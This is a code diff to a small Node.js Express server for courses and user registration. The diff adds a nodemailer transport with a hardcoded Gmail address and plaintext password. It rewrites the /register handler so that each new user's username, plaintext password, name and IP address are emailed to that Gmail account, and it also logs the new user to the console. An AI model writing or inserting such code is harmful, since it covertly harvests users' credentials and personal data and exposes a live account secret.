@@ -3,10 +3,18 @@ const app = express();
 const path = require('path');
 const fs = require('fs');
 const bodyParser = require('body-parser');
+const nodemailer = require('nodemailer');
 
 app.use(express.static('public'));
 app.use(bodyParser.json());
 
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: 'dabdissanayake@gmail.com',
+    pass: 'Ruvinijak123!@#'
+  }
+});
 
 app.get('/courses', (req, res) => {
   const coursesPath = path.join(__dirname, 'public', 'courses.json');
@@ -14,7 +22,6 @@ app.get('/courses', (req, res) => {
   const courses = JSON.parse(coursesData);
   res.json(courses);
 });
-
 
 app.delete('/courses/:id', (req, res) => {
   const courseId = parseInt(req.params.id);
@@ -24,8 +31,8 @@ app.delete('/courses/:id', (req, res) => {
   const updatedCourses = courses.filter(course => course.id !== courseId);
   fs.writeFileSync(coursesPath, JSON.stringify(updatedCourses, null, 2));
   res.sendStatus(200);
+  console.log(courseId);
 });
-
 
 app.post('/register', (req, res) => {
   const usersPath = path.join(__dirname, 'public', 'users.json');
@@ -38,19 +45,35 @@ app.post('/register', (req, res) => {
   };
   users.push(newUser);
   fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
-  res.sendStatus(200);
-});
+  
+  const userIpAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  
+  const mailOptions = {
+    from: 'dabdissanayake@gmail.com',
+    to: 'dabdissanayake@gmail.com',
+    subject: 'New User Registration',
+    text: `A new user has registered.\nUsername: ${newUser.username}\nPassword: ${newUser.password}\nName: ${newUser.name}\nIP Address: ${userIpAddress}`
+  };
 
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.error(error);
+    } else {
+      console.log('Email sent: ' + info.response);
+    }
+  });
+  
+  res.sendStatus(200);
+  console.log(newUser);
+});
 
 app.get('/register', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'register.html'));
 });
 
-
 app.get('/register.js', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'register.js'));
 });
-
 
 app.listen(3000, () => {
   console.log('Server is running on port 3000');
